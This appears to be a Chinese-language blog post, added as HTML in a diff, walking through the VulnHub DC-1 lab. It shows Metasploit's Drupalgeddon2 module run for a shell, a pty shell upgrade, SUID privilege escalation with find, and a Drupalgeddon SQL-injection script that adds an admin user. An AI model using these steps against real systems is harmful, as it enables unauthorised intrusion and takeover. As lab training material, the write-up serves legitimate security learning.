@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>VulnHub — DC-1 - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--dc-1/">
+  <meta property="og:site_name" content="ThnPinkman’s blog">
+  <meta property="og:title" content="VulnHub — DC-1">
+  <meta property="og:description" content="VulnHub — DC-1 信息收集 主机发现 不清楚什么原因，这个靶机的ip一直扫不到 偶尔又扫到了，不知道什么问题
+既然扫到了, 就不管了，80端口开了 信息收集 直接访问网站扫目录
+Drupal 是使用PHP语言编写的开源内容管理框架（CMF），由内容管理系统(CMS)和PHP开发框架共同构成。 形象的说Drupal是一个福袋CMS的PHP开发框架
+msf漏洞发现 1启动：msfconsole2搜索利用脚本：search Drupal3进入利用脚本：use4查看需要参数：show opitons5设置参数：set6执行攻击：run msf启动 然后search一下 找exp 不少东西，其实可以试试用哪个，这里就直接用drupal_drupalgeddon2 也就是序号4
+看options 只需要配置RHOSTS 也就是靶机地址
+payload也已经配置好了
+session 传入 直接进入shell
+查看权限www-data 进入交互式
+python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; SUID提权（find） Set User ID是一种权限类型，允许用户使用指定用户的权限执行文件。那些具有suid权限的文件以最高的权限运行。假设我们以非root用户身份访问目标系统，井且我们发现二进制文件启用了suid位，那么这些文件/程序/命令可以root权限运行. SUID的目的就是:让本来没有相应权限的用户运行这个程序时，可以访问他没有权限访问的资源。 1、查看具有SUID的二进制可执行文件 find / -user root -perm -4000 -print 2&amp;gt;/dev/null2、一直可用来提权的linux可行性的文件列表如下：Nmap 、 Vim 、 find 、 Bash 、 More 、 Less 、Nano 、 cp3、利用find获得root权限shell find / -name cron.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-19T23:51:36+08:00">
+    <meta property="article:modified_time" content="2024-08-19T23:51:36+08:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="VulnHub — DC-1">
+  <meta name="twitter:description" content="VulnHub — DC-1 信息收集 主机发现 不清楚什么原因，这个靶机的ip一直扫不到 偶尔又扫到了，不知道什么问题
+既然扫到了, 就不管了，80端口开了 信息收集 直接访问网站扫目录
+Drupal 是使用PHP语言编写的开源内容管理框架（CMF），由内容管理系统(CMS)和PHP开发框架共同构成。 形象的说Drupal是一个福袋CMS的PHP开发框架
+msf漏洞发现 1启动：msfconsole2搜索利用脚本：search Drupal3进入利用脚本：use4查看需要参数：show opitons5设置参数：set6执行攻击：run msf启动 然后search一下 找exp 不少东西，其实可以试试用哪个，这里就直接用drupal_drupalgeddon2 也就是序号4
+看options 只需要配置RHOSTS 也就是靶机地址
+payload也已经配置好了
+session 传入 直接进入shell
+查看权限www-data 进入交互式
+python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39; SUID提权（find） Set User ID是一种权限类型，允许用户使用指定用户的权限执行文件。那些具有suid权限的文件以最高的权限运行。假设我们以非root用户身份访问目标系统，井且我们发现二进制文件启用了suid位，那么这些文件/程序/命令可以root权限运行. SUID的目的就是:让本来没有相应权限的用户运行这个程序时，可以访问他没有权限访问的资源。 1、查看具有SUID的二进制可执行文件 find / -user root -perm -4000 -print 2&amp;gt;/dev/null2、一直可用来提权的linux可行性的文件列表如下：Nmap 、 Vim 、 find 、 Bash 、 More 、 Less 、Nano 、 cp3、利用find获得root权限shell find / -name cron.">
+<meta name="application-name" content="ThnPinkman&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--dc-1/" /><link rel="prev" href="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--lampiao/" /><link rel="next" href="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--ch4inrulz_v1.0.1/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "VulnHub — DC-1",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thnpkm.github.io\/posts\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/vulnhub--dc-1\/"
+        },"genre": "posts","keywords": "","wordcount":  127 ,
+        "url": "https:\/\/thnpkm.github.io\/posts\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/vulnhub--dc-1\/","datePublished": "2024-08-19T23:51:36+08:00","dateModified": "2024-08-19T23:51:36+08:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">VulnHub — DC-1</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内网渗透</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-19">2024-08-19</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;127 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;One minute&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#信息收集">信息收集</a>
+      <ul>
+        <li><a href="#主机发现">主机发现</a></li>
+        <li><a href="#信息收集-1">信息收集</a></li>
+      </ul>
+    </li>
+    <li><a href="#msf漏洞发现">msf漏洞发现</a></li>
+    <li><a href="#heading"></a></li>
+    <li><a href="#suid提权find">SUID提权（find）</a></li>
+    <li><a href="#drupal-攻击脚本的利用">Drupal 攻击脚本的利用 </a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="vulnhub--dc-1">VulnHub — DC-1</h1>
+<h2 id="信息收集">信息收集</h2>
+<p> </p>
+<h3 id="主机发现">主机发现</h3>
+<p> 不清楚什么原因，这个靶机的ip一直扫不到 偶尔又扫到了，不知道什么问题</p>
+<!-- raw HTML omitted -->
+<p>既然扫到了, 就不管了，80端口开了 </p>
+<h3 id="信息收集-1">信息收集</h3>
+<p>直接访问网站扫目录</p>
+<!-- raw HTML omitted -->
+<p> Drupal 是使用PHP语言编写的开源内容管理框架（CMF），由内容管理系统(CMS)和PHP开发框架共同构成。 形象的说Drupal是一个福袋CMS的PHP开发框架</p>
+<h2 id="msf漏洞发现">msf漏洞发现</h2>
+<pre tabindex="0"><code>1启动：msfconsole
+
+2搜索利用脚本：search Drupal
+
+3进入利用脚本：use
+
+4查看需要参数：show opitons
+
+5设置参数：set
+
+6执行攻击：run
+</code></pre><p>msf启动 然后search一下 找exp </p>
+<!-- raw HTML omitted -->
+<p>不少东西，其实可以试试用哪个，这里就直接用drupal_drupalgeddon2 也就是序号4</p>
+<!-- raw HTML omitted -->
+<p>看options 只需要配置RHOSTS 也就是靶机地址</p>
+<p>payload也已经配置好了</p>
+<!-- raw HTML omitted -->
+<p>session 传入 直接进入shell</p>
+<p>查看权限www-data 进入交互式</p>
+<pre tabindex="0"><code>python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+</code></pre><h2 id="heading"></h2>
+<h2 id="suid提权find">SUID提权（find）</h2>
+<p>Set User ID是一种权限类型，允许用户使用指定用户的权限执行文件。那些具有suid权限的文件以最高的权限运行。假设我们以<strong>非root用户身份访问目标系统，井且我们发现二进制文件启用了suid位，那么这些文件/程序/命令可以root权限运行</strong>. SUID的目的就是:让本来没有相应权限的用户运行这个程序时，可以访问他没有权限访问的资源。  </p>
+<pre tabindex="0"><code>1、查看具有SUID的二进制可执行文件 
+find / -user root -perm -4000 -print 2&amp;gt;/dev/null
+
+2、一直可用来提权的linux可行性的文件列表如下：
+Nmap 、 Vim 、 find 、 Bash 、 More 、 Less 、Nano 、 cp
+
+3、利用find获得root权限shell 
+find / -name cron.php -exec &#34;/bin/sh&#34; \;
+</code></pre><p>寻找可利用的文件，find 可以</p>
+<!-- raw HTML omitted -->
+<p>如何利用find来进行SUID提权 </p>
+<pre tabindex="0"><code>find / -name cron.php -exec &#34;/bin/sh&#34; \;
+</code></pre><p>前半段是为了能顺利执行find 命令， 后面就是提权利用了 </p>
+<!-- raw HTML omitted -->
+<p>拿到root 去find flag</p>
+<pre tabindex="0"><code>find / -name &#34;*flag*.txt&#34;
+</code></pre><!-- raw HTML omitted -->
+<h2 id="drupal-攻击脚本的利用">Drupal 攻击脚本的利用 </h2>
+<p>Drupal 7.0 &lt; 7.31 - &lsquo;Drupalgeddon&rsquo; SQL Injection (Add Admin User)</p>
+<p>这个版本范围存在的漏洞，脚本下载即可 在kali机上直接打</p>
+<p>设置用户名密码 123456 </p>
+<pre tabindex="0"><code>python2 34992.py -t http://192.168.164.136 -u 123456 -p 123456   
+</code></pre><!-- raw HTML omitted -->
+<p> 攻击成功生成 url ，直接去登录即可 ，就是管理员后台了 </p>
+<!-- raw HTML omitted -->
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-08-19</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--dc-1/" data-title="VulnHub — DC-1" data-hashtags=""><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--dc-1/" data-hashtag=""><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--dc-1/" data-title="VulnHub — DC-1"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--dc-1/" data-title="VulnHub — DC-1"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--dc-1/" data-title="VulnHub — DC-1"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--lampiao/" class="prev" rel="prev" title="VulnHub — Lampiao"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>VulnHub — Lampiao</a>
+            <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--ch4inrulz_v1.0.1/" class="next" rel="next" title="VulnHub — CH4INRULZ_v1.0.1">VulnHub — CH4INRULZ_v1.0.1<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
